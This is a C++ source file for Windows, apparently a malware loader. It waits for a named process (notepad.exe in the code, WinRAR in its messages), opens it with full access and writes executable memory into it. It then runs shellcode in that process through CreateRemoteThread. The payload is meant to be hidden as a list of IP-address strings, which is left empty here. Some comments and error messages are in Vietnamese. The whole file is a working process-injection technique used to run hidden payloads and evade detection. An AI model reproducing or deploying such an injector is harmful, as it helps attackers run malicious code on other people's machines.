#include <windows.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <TlHelp32.h>


DWORD FindProcessID(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (!_wcsicmp(pe.szExeFile, processName)) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return pid;
}



std::vector<unsigned char> ipAddressesToBytes(const std::vector<std::string>& ipAddresses) {
    std::vector<unsigned char> byteArray;

    for (const auto& ip : ipAddresses) {
        std::stringstream ss(ip);
        std::string segment;
        while (getline(ss, segment, '.')) {
            int byteValue = stoi(segment);
            byteArray.push_back(static_cast<unsigned char>(byteValue));
        }
    }

    return byteArray;
}



int main() {


    std::vector < std::string > ipAddresses = {
        
    };


    auto byteArray = ipAddressesToBytes(ipAddresses);
    size_t byteVarSize = byteArray.size();

    unsigned char* byteVar = new unsigned char[byteArray.size()];

    for (size_t i = 0; i < byteVarSize; ++i) {
        byteVar[i] = byteArray[i];
    }

    const wchar_t* targetProcess = L"notepad.exe";

    // Chờ đợi cho đến khi tiến trình WinRAR xuất hiện
    DWORD pid = 0;
    while ((pid = FindProcessID(targetProcess)) == 0) {
        std::cout << "Wait for WinRAR.exe to start...\n";
        Sleep(1000);  // Chờ 1 giây trước khi kiểm tra lại
    }

    std::cout << "WinRAR.exe founded, PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "Không thể mở tiến trình: " << pid << "\n";
        return -1;
    }

    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, byteVarSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        std::cerr << "Không thể cấp phát bộ nhớ từ xa!\n";
        CloseHandle(hProcess);
        return -1;
    }

    if (!WriteProcessMemory(hProcess, remoteBuffer, byteVar, byteVarSize, NULL)) {
        std::cerr << "Không thể ghi shellcode vào bộ nhớ từ xa!\n";
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "Không thể tạo luồng từ xa!\n";
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
